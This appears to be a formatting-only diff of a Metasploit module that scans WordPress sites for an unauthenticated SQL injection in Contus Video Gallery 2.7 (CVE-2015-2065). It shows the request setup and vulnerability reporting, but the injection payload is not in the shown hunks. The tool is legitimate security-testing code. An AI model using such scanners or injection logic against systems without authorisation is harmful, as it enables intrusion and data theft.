@@ -9,25 +9,27 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'WordPress Contus Video Gallery Unauthenticated SQL Injection Scanner',
-      'Description' => %q{
-      This module attempts to exploit a UNION-based SQL injection in Contus Video
-      Gallery for Wordpress version 2.7 and likely prior in order if the instance is
-      vulnerable.
-      },
-      'Author'       =>
-        [
-          'Claudio Viviani', #discovery
-          'bperry' #metasploit module
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Contus Video Gallery Unauthenticated SQL Injection Scanner',
+        'Description' => %q{
+          This module attempts to exploit a UNION-based SQL injection in Contus Video
+          Gallery for Wordpress version 2.7 and likely prior in order if the instance is
+          vulnerable.
+        },
+        'Author' => [
+          'Claudio Viviani', # discovery
+          'bperry' # metasploit module
         ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2015-2065'],
           [ 'WPVDB', '7793' ]
         ],
-      'DisclosureDate' => '2015-02-24'))
+        'DisclosureDate' => '2015-02-24'
+      )
+    )
   end
 
   def run_host(ip)
@@ -38,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Checking host")
 
     res = send_request_cgi({
-      'uri'       => wordpress_url_admin_ajax,
+      'uri' => wordpress_url_admin_ajax,
       'vars_get' => {
         'action' => 'rss',
         'type' => 'video',
@@ -55,11 +57,11 @@ class MetasploitModule < Msf::Auxiliary
     if result
       print_good("Vulnerable to unauthenticated SQL injection within Contus Video Gallery 2.7 for Wordpress")
       report_vuln({
-        :host  => rhost,
-        :port  => rport,
+        :host => rhost,
+        :port => rport,
         :proto => 'tcp',
-        :name  => "Unauthenticated UNION-based SQL injection in Contus Video Gallery 2.7 for Wordpress",
-        :refs  => self.references.select { |ref| ref.ctx_val == "2015-2065" }
+        :name => "Unauthenticated UNION-based SQL injection in Contus Video Gallery 2.7 for Wordpress",
+        :refs => self.references.select { |ref| ref.ctx_val == "2015-2065" }
       })
     end
   end
